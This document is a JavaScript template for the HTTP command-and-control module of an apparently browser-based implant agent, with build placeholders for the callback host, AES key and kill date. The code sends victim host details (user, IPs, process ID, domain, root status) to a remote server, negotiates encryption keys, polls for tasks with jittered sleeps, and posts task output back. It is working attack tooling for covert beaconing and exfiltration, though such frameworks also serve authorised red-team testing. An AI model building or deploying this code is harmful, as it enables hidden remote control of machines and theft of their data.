//-------------RESTFUL C2 mechanisms ---------------------------------

AES_JS_HERE

function base64ToByteArray(base64String) {
    var dec_key = atob(base64String);
    var key = [];
        for (var i = 0; i < dec_key.length; i++) {
        key.push(dec_key.charCodeAt(i));
    }
    return key;
}

function arraysEqual(a, b) {
	if (a === b) return true;
	if (a == null || b == null) return false;
	if (a.length !== b.length) return false;
  
	// If you don't care about the order of the elements inside
	// the array, you should sort both arrays here.
	// Please note that calling sort on an array will modify that array.
	// you might want to clone your array first.
  
	for (var i = 0; i < a.length; ++i) {
	  if (a[i] !== b[i]) return false;
	}
	return true;
  }

SHA_256_JS_HERE

ETHEREUM_JS_HERE

module = {}

CRYPTO_JS_HERE

FORGE_JS_HERE

class customC2 extends baseC2{
	constructor(interval, cback_host, cback_port){
		if(cback_port === "443" && cback_host.includes("https://")){
			super(interval, cback_host);
		}else if(cback_port === "80" && cback_host.includes("http://")){
			super(interval, cback_host);
		}else{
			let last_slash = cback_host.indexOf("/", 8);
			if(last_slash === -1){
				//there is no 3rd slash
				super(interval, cback_host + ":" + cback_port);
			}else{
				//there is a 3rd slash, so we need to splice in the port
				super(interval,cback_host.substring(0, last_slash) + ":" + cback_port + "/" + cback_host.substring(last_slash))
			}
		}
		this.commands = [];
		this.url = this.baseurl;
		this.getURI = "get_uri";
		this.postURI = "post_uri";
		this.queryPathName = "query_path_name";
		this.proxyURL = "proxy_host";
		this.proxyPort = "proxy_port";
		this.proxyUser = "proxy_user";
		this.proxyPassword = "proxy_pass";
		this.proxy_dict = {};
		if(this.proxyURL !== ""){
			if(this.proxyURL.includes("https")) {
				this.proxy_dict["HTTPSEnable"] = 1;
				this.proxy_dict["HTTPSProxy"] = this.proxyURL;
				this.proxy_dict["HTTPSPort"] = parseInt(this.proxyPort);
			}else{
				this.proxy_dict["HTTPEnable"] = 1;
				this.proxy_dict["HTTPProxy"] = this.proxyURL;
				this.proxy_dict["HTTPPort"] = parseInt(this.proxyPort);
			}
		}
		if(this.proxyUser !== ""){
			this.proxy_dict["kCFProxyUsernameKey"] = this.proxyUser;
		}
		if(this.proxyPassword !== ""){
			this.proxy_dict["kCFProxyPasswordKey"] = this.proxyPassword;
		}
		this.jitter = callback_jitter;
		this.header_list = headers;
		this.aes_psk = "AESPSK"; // base64 encoded key
		if(this.aes_psk !== ""){
            this.cryptokey = base64ToByteArray(this.aes_psk);
		}
        this.using_key_exchange = "encrypted_exchange_check" === "T";
		this.exchanging_keys = this.using_key_exchange;
		this.kill_date = new Date("killdate");
	}
	get_random_int(max) {
        return Math.floor(Math.random() * Math.floor(max + 1));
    }
hexToBytes(hex) {
    for (var bytes = [], c = 0; c < hex.length; c += 2)
        bytes.push(parseInt(hex.substr(c, 2), 16));
    return bytes;
}
    gen_sleep_time(){
      //generate a time that's this.interval += (this.interval * 1/this.jitter)
      if(this.jitter < 1){return this.interval;}
      let plus_min = this.get_random_int(1);
      if(plus_min === 1){
          return (this.interval + (this.interval * (this.get_random_int(this.jitter)/100)))*1000;
      }else{
          return (this.interval - (this.interval * (this.get_random_int(this.jitter)/100)))*1000;
      }
    }
	async encrypt_message(uid, data){
	    // takes in the string we're about to send, encrypts it, and returns a new string
		var textBytes = aesjs.utils.utf8.toBytes(data);
		var IV = Uint8Array.from({length: 16}, () => Math.floor(Math.random() * 16));
		var aesCbc = new aesjs.ModeOfOperation.cbc(this.cryptokey, IV);
		textBytes = aesjs.padding.pkcs7.pad(textBytes);
		var encryptedData = aesCbc.encrypt(textBytes);
		var hmac_input = new Uint8Array(IV.length + encryptedData.length);
		var uid_enc = new TextEncoder("utf-8").encode(uid);
		hmac_input.set(IV);
		hmac_input.set(encryptedData,IV.length);
		var hmac_data = this.hexToBytes(sha256.hmac(this.cryptokey, hmac_input));
		var final_message = new Uint8Array(uid_enc.length + IV.length + encryptedData.length + hmac_data.length);	
	    final_message.set(uid_enc);
		final_message.set(IV,uid_enc.length);
		final_message.set(encryptedData,uid_enc.length + IV.length);
		final_message.set(hmac_data,uid_enc.length + IV.length + encryptedData.length);
		return encodeURIComponent(ethereumjs.Buffer.Buffer.from(final_message).toString('base64'));

	}
	decrypt_message(nsdata){
        //takes in a base64 encoded string to be decrypted and returned
        //console.log("called decrypt");
		var iv_range = nsdata.slice(0,16);
		var message_range = nsdata.slice(16, nsdata.length-32);
		var hmac_range = nsdata.slice(nsdata.length-32, nsdata.length);
		var hmac_data_range = nsdata.slice(0, nsdata.length - 32);
		var hmac_range = this.stringToBytes(hmac_range)
		if (arraysEqual(hmac_range, this.hexToBytes(sha256.hmac(this.stringToBytes(atob(this.aes_psk)),this.stringToBytes(hmac_data_range))))){
			var aesCbc = new aesjs.ModeOfOperation.cbc(this.cryptokey, this.stringToBytes(iv_range));
			var decryptedData = aesCbc.decrypt(this.stringToBytes(message_range));
			return new TextDecoder().decode(decryptedData);
		}else{
			return undefined;
		}
	}
	exportPublicKey(keys) {
		return new Promise(function(resolve) {
		  window.crypto.subtle.exportKey('spki', keys.publicKey).
		  then(function(spki) {
			resolve(convertBinaryToPem(spki, "RSA PUBLIC KEY"))
		  })
		})
	}
	convertArr (wordArray) {
        // Shortcuts
        	var words = wordArray.words;
        	var sigBytes = wordArray.sigBytes;

        // Convert
        	var u8 = new Uint8Array(sigBytes);
        	for (var i = 0; i < sigBytes; i++) {
            		var byte = (words[i >>> 2] >>> (24 - (i % 4) * 8)) & 0xff;
            		u8[i]=byte;
        	}

        	return u8;
    	}
	convertBinaryToPem(binaryData, label) {
		var base64Cert = arrayBufferToBase64String(binaryData)
		var pemCert = "-----BEGIN " + label + "-----\r\n"
		var nextIndex = 0
		var lineLength
		while (nextIndex < base64Cert.length) {
		  if (nextIndex + 64 <= base64Cert.length) {
			pemCert += base64Cert.substr(nextIndex, 64) + "\r\n"
		  } else {
			pemCert += base64Cert.substr(nextIndex) + "\r\n"
		  }
		  nextIndex += 64
		}
		pemCert += "-----END " + label + "-----\r\n"
		return pemCert
	}
	arrayBufferToBase64String(arrayBuffer) {
		var byteArray = new Uint8Array(arrayBuffer)
		var byteString = ''
		for (var i=0; i<byteArray.byteLength; i++) {
		  byteString += String.fromCharCode(byteArray[i])
		}
		return btoa(byteString)
	}
	async decryptRSA(key, ciphertext) {
		//var privateKeyDer = this.arrayBufferToString(key); //pkcs#8 to DER
        var privateKeyB64 = this.b64EncodeUnicode(key); //btoa(privateKeyDer);
        var privateKeyPEMwithLines = this.addNewLines(privateKeyB64);  //split PEM into 64 character strings
        var privateKeyPEMwithoutLines = this.removeLines(privateKeyPEMwithLines);  //join PEM
        var privateKeyDerDecoded = this.b64DecodeUnicode(privateKeyPEMwithoutLines);  // atob(privateKeyB64);
        var privateKeyArrayBuffer = this.stringToArrayBuffer(privateKeyDerDecoded);  //DER to arrayBuffer
	var imported_key = window.crypto.subtle.importKey(  //importKEy
            "pkcs8",
            privateKeyArrayBuffer,
            {
                name: "RSA-OAEP",
                hash: {name: "SHA-256"}
            },
            true,
            ["decrypt"]).then(imp_key => {
    return imp_key
})
		let decrypted = window.crypto.subtle.decrypt(
		  {
			name: 'RSA-OAEP',
		  },
		  imported_key,
		  ciphertext
		);
		return new TextDecoder().decode(decrypted);
	}
	hexToBytes(hex) {
    		for (var bytes = [], c = 0; c < hex.length; c += 2)
        		bytes.push(parseInt(hex.substr(c, 2), 16));
    		return bytes;
	}
	parse (u8arr) {
        // Shortcut
        	var len = u8arr.length;

        // Convert
        	var words = [];
        	for (var i = 0; i < len; i++) {
        		words[i >>> 2] |= (u8arr[i] & 0xff) << (24 - (i % 4) * 8);
        	}

        	return CryptoJS.lib.WordArray.create(words, len);
    	}
convertBinaryToPem(binaryData, label) {
      var base64Cert = arrayBufferToBase64String(binaryData)
      var pemCert = "-----BEGIN " + label + "-----\r\n"
      var nextIndex = 0
      var lineLength
      while (nextIndex < base64Cert.length) {
        if (nextIndex + 64 <= base64Cert.length) {
          pemCert += base64Cert.substr(nextIndex, 64) + "\r\n"
        } else {
          pemCert += base64Cert.substr(nextIndex) + "\r\n"
        }
        nextIndex += 64
      }
      pemCert += "-----END " + label + "-----\r\n"
      return pemCert
    }
arrayBufferToBase64(arr) {
      return btoa(String.fromCharCode.apply(null, new Uint8Array(arr)))
    }
exportPublicKey(keys) {
      return new Promise(function(resolve) {
        window.crypto.subtle.exportKey('spki', keys.publicKey).
        then(function(spki) {
          resolve(convertBinaryToPem(spki, "RSA PUBLIC KEY"))
        })
      })
    }
stringToBytes ( str ) {
  var ch, st, re = [];
  for (var i = 0; i < str.length; i++ ) {
    ch = str.charCodeAt(i);  // get char 
    st = [];                 // set up "stack"
    do {
      st.push( ch & 0xFF );  // push byte to stack
      ch = ch >> 8;          // shift value down by 1 byte
    }  
    while ( ch );
    // add stack contents to result
    // done because chars have "wrong" endianness
    re = re.concat( st.reverse() );
  }
  // return an array of bytes
  return re;
}
b64EncodeUnicode(str) {
    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
        return String.fromCharCode('0x' + p1);
    }));
}

b64DecodeUnicode(str) {
    return decodeURIComponent(Array.prototype.map.call(atob(str), function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}

addNewLines(str) {
    var finalString = '';
    for(var i=0; i < str.length; i++) {
        finalString += str.substring(0, 64) + '\n';
        str = str.substring(64);
    }
    finalString += str;

    return finalString;
}

removeLines(pem) {
    var lines = pem.split('\n');
    var encodedString = '';
    for(var i=0; i < lines.length; i++) {
        encodedString += lines[i].trim();
    }
    return encodedString;
}

stringToArrayBuffer(byteString){
    var byteArray = new Uint8Array(byteString.length);
    for(var i=0; i < byteString.length; i++) {
        byteArray[i] = byteString.codePointAt(i);
    }
    return byteArray;
}

arrayBufferToString(exportedPrivateKey){
    var byteArray = new Uint8Array(exportedPrivateKey);
    var byteString = '';
    for(var i=0; i < byteArray.byteLength; i++) {
        byteString += String.fromCodePoint(byteArray[i]);
    }
    return byteString;
}
get_random_int(max) {
    return Math.floor(Math.random() * Math.floor(max + 1));
}
	_base64ToArrayBuffer(base64) {
		var binary_string = window.atob(base64);
		var len = binary_string.length;
		var bytes = new Uint8Array(len);
		for (var i = 0; i < len; i++) {
			bytes[i] = binary_string.charCodeAt(i);
		}
		return bytes.buffer;
	}
	async negotiate_key(){
        // Generate a public/private key pair
		var rsa = forge.pki.rsa;
		var keypair = rsa.generateKeyPair({bits: 4096, e: 0x10001});
		var pki = forge.pki;
		let exported_public = pki.publicKeyToPem(keypair.publicKey);
		exported_public = btoa(exported_public.replace(/(?:\\[rn]|[\r\n]+)+/g, "\n").slice(0, exported_public.length-15));
		let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	    let session_key = Array(20).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
	    let initial_message = {"session_id": session_key, "pub_key": exported_public, "action": "staging_rsa"};
	    // Encrypt our initial message with sessionID and Public key with the initial AES key
	    while(true){
	        try{
	        	var stage1 = await this.htmlPostData(initial_message, bowser.uuid);
	        	var enc_key = this._base64ToArrayBuffer(stage1['session_key']);
			var dec_key = keypair.privateKey.decrypt(forge.util.decode64(stage1['session_key']),'RSA-OAEP');
                // Adjust our global key information with the newly adjusted session key
				this.aes_psk = btoa(dec_key);
                //console.log(JSON.stringify(json_response));
                this.raw_key = atob(this.aes_psk);
		const encoder = new TextEncoder('utf-8');
                this.cryptokey = base64ToByteArray(this.aes_psk);
                this.exchanging_keys = false;
                return stage1['uuid'];
            }catch(error){
            	console.log(error.toString());
				await new Promise(r => setTimeout(r, this.gen_sleep_time()));
            }
        }
	}
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
        let config = {
            "C2": {
                "baseurl": this.baseurl,
                "interval": this.interval,
                "jitter": this.jitter,
                "commands": this.commands.join(", "),
                "api_version": this.api_version,
                "header_list": this.header_list,
                "aes_psk": this.aes_psk
            },
            "Host": {
                "user": bowser.user,
                "fullName": bowser.fullName,
                "ips": bowser.ip,
                "hosts": bowser.host,
                "environment": bowser.environment,
                "uptime": bowser.uptime,
                "args": bowser.args,
                "pid": bowser.pid,
                "bowser_id": bowser.id,
                "payload_id": bowser.uuid
            }};
		return JSON.stringify(config, null, 2);
	}
	async checkin(ip, pid, user, host, os, arch, domain){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':bowser.uuid, "os":os, "architecture": arch, "domain": domain, "action": "checkin"};
		info["process_name"] = "N/A";
		info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
		if(user === "root"){
		    info['integrity_level'] = 3;
		}
		//calls htmlPostData(url,data) to actually checkin
		//Encrypt our data
		//gets back a unique ID
        if(this.using_key_exchange){
            let sessionID = await this.negotiate_key();
            //console.log("got session ID: " + sessionID);
            var jsondata = await this.htmlPostData(info, sessionID);
        }else{
            var jsondata = await this.htmlPostData(info, bowser.uuid);
        }
		bowser.id = jsondata.id;
		// if we fail to get a new ID number, then exit the application
		if(bowser.id === undefined){ throw new Error();		}
		//console.log(bowser.id);
		return jsondata;
	}
	async getTasking(){
		while(true){
		    try{
		        //let data = {"tasking_size":1, "action": "get_tasking"};
		        //let task = this.htmlPostData(this.url, data, bowser.id);
				let task = await this.htmlGetData();
		        //console.log("tasking got back: " + JSON.stringify(task));
			await new Promise(r => setTimeout(r, this.gen_sleep_time()));
		        return task['tasks'];
		    }
		    catch(error){
		    	//console.log(error.toString());
		       await new Promise(r => setTimeout(r, this.gen_sleep_time()));  // don't spin out crazy if the connection fails
		    }
		}
	}
	postResponse(task, output){
	    // this will get the task object and the response output
	    return this.postRESTResponse(output, task.id);
	}
	postRESTResponse(data, tid){
		//depending on the amount of data we're sending, we might need to chunk it
		data["task_id"] =  tid;
		let postData = {"action": "post_response", "responses": [data]};
		return this.htmlPostData(postData, bowser.id);
	}
	async htmlPostData(sendData, uid, json=true){
	    let url = this.baseurl;
	    if(this.postURI !== ""){ url += "/" + this.postURI;}
        //console.log(url);
        //encrypt our information before sending it
		let data;
        if(this.aes_psk !== ""){
            data = await this.encrypt_message(uid, JSON.stringify(sendData));
        }else if(typeof(sendData) === "string"){
        	data = uid + sendData;
            data = btoa(data);
        }else{
        	data = uid + JSON.stringify(sendData);
            data = btoa(data);
		}
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				if( C2.kill_date < new Date()){
					throw new Error("end");
				}
				if( (bowser.id === undefined || bowser.id === "") && (uid === undefined || uid === "")){ throw new Error("end");}
				let postData = decodeURIComponent(data);
				const request = new XMLHttpRequest();
				request.open('POST', url, false);  // `false` makes the request synchronous
				request.send(postData);

				let responseData = request.responseText;
				//responseData is base64(UUID + data)
				if( responseData.length < 36){
					await new Promise(r => setTimeout(r, this.gen_sleep_time()));
			    	continue;
				}
				let resp = atob(responseData);
				//let uuid_range = $.NSMakeRange(0, 36);
				resp = resp.slice(36,resp.length);
				//we're not doing the initial key exchange
				if(this.aes_psk !== ""){
					//if we do need to decrypt the response though, do that
					if(json){
						resp = this.decrypt_message(resp);
						resp = resp.replace(/\f/g, '');
						let enc = new TextEncoder();
						resp = this.pkcs7strip(enc.encode(resp))
						let decoder = new TextDecoder();
						resp = decoder.decode(resp);
						return JSON.parse(resp);
					}else{
						return this.decrypt_message(resp);
					}
				}else{
					//we don't need to decrypt it, so we can just parse and return it
					if(json){
						return JSON.parse(resp);
					}else{
						return resp;
					}
				}
			}
			catch(error){
				//console.log(error.toString());
			   await new Promise(r => setTimeout(r, this.gen_sleep_time()));  // don't spin out crazy if the connection fails
			}
		}
	}
	async htmlGetData(){
		let data = {"tasking_size":1, "action": "get_tasking"};
		if(this.aes_psk !== ""){
			data = await this.encrypt_message(bowser.id, JSON.stringify(data));
		}else{
			data = bowser.uuid + JSON.stringify(data);
			data = btoa(data)
		}
		let url = this.baseurl;
		if(this.getURI !== ""){ url += "/" + this.getURI; }
		url += "?" + this.queryPathName + "=" + data;
	    while(true && this.exchanging_keys == false){
	        try{
	        	if( C2.kill_date < new Date()){
					throw new Error("end");
				}
	        	if(bowser.id === undefined || bowser.id === ""){ throw new Error("end");}

				const request = new XMLHttpRequest();
				request.open('GET', url, false);  // `false` makes the request synchronous
				request.send(null);

	            		let responseData = request.responseText;
				if( responseData.length < 36){
					await new Promise(r => setTimeout(r, this.gen_sleep_time()));
			    	continue;
				}
				let resp = atob(responseData);
				//let uuid_range = $.NSMakeRange(0, 36);
				resp = resp.slice(36,resp.length);
				//we're not doing the initial key exchange
				if(this.aes_psk !== ""){
					//if we do need to decrypt the response though, do that
					resp = this.decrypt_message(resp);
					return JSON.parse(resp);
				}else{
					//we don't need to decrypt it, so we can just parse and return it
					return JSON.parse(resp);
				}
	        }
	        catch(error){
	            //console.log("error in htmlGetData: " + error.toString());
	           await new Promise(r => setTimeout(r, this.gen_sleep_time())); 
		   break;
	        }
	    }
	}
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
var C2 = new customC2(callback_interval, "callback_host", "callback_port");
